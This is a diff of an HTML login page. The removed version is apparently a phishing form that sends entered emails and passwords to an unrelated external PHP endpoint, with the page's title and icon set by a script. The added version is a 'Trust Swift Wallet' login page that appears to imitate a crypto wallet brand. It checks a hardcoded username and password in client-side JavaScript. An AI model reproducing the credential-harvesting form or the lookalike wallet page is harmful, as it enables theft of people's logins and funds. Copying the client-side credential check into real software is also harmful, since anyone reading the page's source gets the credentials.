@@ -1,35 +1,233 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <title>Login Form</title>
-    <style>
-       
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Trust Swift Wallet - Login</title>
+
+  <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.glitch.global/5126d383-2b49-4b4c-ab3f-3b9ed06b0ba4/favicon-32x32.png?1732388281684" />
+  <link rel="icon" type="image/png" sizes="16x16" href="https://cdn.glitch.global/5126d383-2b49-4b4c-ab3f-3b9ed06b0ba4/favicon-16x16.png?1732388268471" />
+
+  <style>
+    :root {
+      --bg: #ffffff;
+      --card: #f9fafc;
+      --muted: #6b7280;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --border: rgba(0,0,0,0.08);
+      --error: #dc2626;
+      --shadow-light: rgba(37, 99, 235, 0.15);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: var(--bg);
+      color: #111827;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Header */
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 18px 32px;
+      background: #fff;
+      border-bottom: 1px solid var(--border);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    .logo-text {
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: var(--accent);
+    }
+
+    /* Main */
+    main {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 16px;
+    }
+
+    .login-card {
+      background: var(--card);
+      border-radius: 18px;
+      padding: 50px 40px;
+      width: 380px;
+      text-align: center;
+      box-shadow: 0 8px 28px var(--shadow-light);
+      transition: box-shadow 0.3s ease;
+    }
+    .login-card:hover {
+      box-shadow: 0 12px 36px rgba(37, 99, 235, 0.25);
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    p.subtext {
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 26px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #374151;
+      text-align: left;
+    }
+
+    input {
+      padding: 14px;
+      border: 1.4px solid var(--border);
+      border-radius: 10px;
+      font-size: 15px;
+      transition: all 0.25s ease;
+    }
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 8px rgba(37, 99, 235, 0.3);
+      outline: none;
+    }
+
+    .login-btn {
+      background: linear-gradient(90deg, var(--accent), var(--accent-hover));
+      color: #fff;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.3);
+      transition: all 0.2s ease;
+    }
+    .login-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 8px 26px rgba(37, 99, 235, 0.45);
+    }
+
+    .error-message {
+      color: var(--error);
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+      min-height: 20px;
+    }
+
+    /* Footer */
+    footer {
+      background: #f9fafc;
+      text-align: center;
+      padding: 16px 0;
+      font-size: 14px;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+    }
+
+    @media (max-width: 440px) {
+      .login-card {
+        width: 100%;
+        padding: 36px 24px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="" alt="Domain Icon" class="domain-icon" id="domainIcon">
-        <h2 id="domainName">Login</h2>
-        <h3 id="domainHeader"></h3>
-        <form id="loginForm" action="https://www.linamargroup.com/ap/xugizrot.php" method="POST">
-            <label for="email">Email:</label>
-            <input type="email" id="email" name="email" required>
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password" >
-            <label>
-            <input type="checkbox" id="savePassword"> Save Password
-            </label>
-            <button type="submit">Continue</button>
-            <div class="error-message" id="errorMessage">Password field is empty</div>
-        </form>
+
+  <header>
+    <div class="logo">
+      <img src="https://cdn.glitch.global/5126d383-2b49-4b4c-ab3f-3b9ed06b0ba4/thumbnails%2Fheader.png?1732388289661" alt="Trust Swift Wallet Logo" />
+      <span class="logo-text"></span>
     </div>
+  </header>
 
-    <script>
+  <main>
+    <section class="login-card">
+      <h1>Welcome Back</h1>
+      <p class="subtext">Login to access your secure wallet</p>
 
-    </script>
-<script src="gen.js"></script>
+      <form id="loginForm" novalidate>
+        <div>
+          <label for="username">Username</label>
+          <input type="text" id="username" name="username" placeholder="Enter your username" required />
+        </div>
+
+        <div>
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Enter your password" required />
+        </div>
+
+        <div class="error-message" id="errorMsg"></div>
+
+        <button type="submit" class="login-btn">Log In</button>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    &copy; 2025 Trust. All Rights Reserved.
+  </footer>
+
+  <script>
+    const loginForm = document.getElementById("loginForm");
+    const errorMsg = document.getElementById("errorMsg");
+
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+
+      errorMsg.textContent = "";
+
+      if (!username || !password) {
+        errorMsg.textContent = "Please fill out both fields.";
+        return;
+      }
+
+      if (username === "user42r" && password === "XfmMCH8Yx") {
+        window.location.href = "user.html";
+      } else {
+        errorMsg.textContent = "Incorrect username or password.";
+      }
+    });
+  </script>
+
 </body>
 </html>
